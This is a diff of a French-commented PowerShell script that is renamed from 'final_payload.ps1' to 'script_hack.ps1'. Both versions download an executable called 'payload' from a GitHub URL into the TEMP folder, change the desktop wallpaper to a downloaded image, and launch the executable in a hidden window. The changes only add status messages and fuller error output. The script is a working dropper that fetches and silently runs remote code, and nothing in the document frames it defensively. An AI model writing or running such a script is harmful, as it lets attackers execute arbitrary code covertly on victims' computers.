@@ -1,27 +1,37 @@
-# final_payload.ps1
+# script_hack.ps1
 try {
-    # URL CORRIGÉE - utilisez raw.githubusercontent.com
+    # Méthode alternative avec gestion d'erreur
+    $webClient = New-Object System.Net.WebClient
+    
+    # Télécharger le payload
     $payloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
-    $payloadPath = "$env:TEMP\final_payload.exe"
+    $payloadPath = "$env:TEMP\payload.exe"
     
-    (New-Object System.Net.WebClient).DownloadFile($payloadUrl, $payloadPath)
+    Write-Host "Téléchargement du payload..."
+    $webClient.DownloadFile($payloadUrl, $payloadPath)
     
-    # Image (déjà correcte)
-    $imageUrl = "https://raw.githubusercontent.com/FogBound-IT/test/793235c441ddaec513ddb5699b33a2cff3b285aa/thumb-1920-423529.jpg"
-    $imagePath = "$env:TEMP\anonymous.jpg"
-    (New-Object System.Net.WebClient).DownloadFile($imageUrl, $imagePath)
+    # Télécharger l'image
+    $imageUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/thumb-1920-423529.jpg" 
+    $imagePath = "$env:TEMP\wallpaper.jpg"
     
+    Write-Host "Téléchargement de l'image..."
+    $webClient.DownloadFile($imageUrl, $imagePath)
+    
+    # Changer le fond d'écran
     Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
     public class Wallpaper {
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
         public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
     }
 "@
     [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)
-    Start-Process -FilePath $payloadPath -WindowStyle Hidden
-    Write-Host "Opération terminée avec succès"
+    
+    # Lancer le payload
+    Start-Process $payloadPath -WindowStyle Hidden
+    Write-Host "Script exécuté avec succès"
+    
 } catch {
-    Write-Host "Erreur: $($_.Exception.Message)"
+    Write-Host "Erreur détaillée: $($_.Exception.ToString())"
 }
